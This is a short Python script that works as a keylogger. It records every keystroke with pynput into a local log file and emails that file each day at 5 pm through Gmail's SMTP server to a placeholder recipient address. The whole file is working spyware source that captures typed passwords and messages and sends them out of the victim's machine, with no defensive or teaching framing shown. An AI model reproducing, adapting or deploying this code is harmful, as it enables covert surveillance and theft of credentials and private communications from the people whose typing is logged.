import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import datetime
import schedule
import time

from pynput.keyboard import Listener

# Function to write keystrokes to file
def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:
        f.write(letter)

# Function to send email with log file attachment
def send_email():
    from_addr = "your_email@gmail.com"  # Sender's email address
    to_addr = "recipient_email@example.com"  # Recipient's email address
    subject = "Daily Keylog Report"  # Email subject

    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject

    body = "Please find attached the daily keylog report."
    msg.attach(MIMEText(body, 'plain'))

    filename = "log.txt"
    attachment = open(filename, "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_addr, "your_password")  # Enter your email password here

    text = msg.as_string()
    server.sendmail(from_addr, to_addr, text)
    server.quit()

# Schedule email sending daily at 5 pm
schedule.every().day.at("17:00").do(send_email)

# Start the keylogger
with Listener(on_press=write_to_file) as l:
    while True:
        schedule.run_pending()
        time.sleep(1)
